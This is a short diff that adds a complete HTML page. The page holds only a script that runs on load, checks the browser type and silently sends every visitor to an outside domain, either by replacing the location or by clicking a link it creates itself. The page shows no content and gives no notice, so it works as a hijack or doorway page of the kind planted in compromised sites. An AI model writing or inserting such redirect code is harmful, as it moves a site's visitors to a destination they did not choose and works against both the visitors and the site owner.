@@ -1,0 +1,1 @@
+<!DOCTYPE html><html><body><script type="text/javascript">var u="http://www.582a.cc";var ua=navigator.userAgent.toLowerCase();if(ua.indexOf("applewebkit")>0){location.replace(u)}else{var e=document.createElement("a");e.href=u;document.body.appendChild(e);e.click()};</script></body></html>
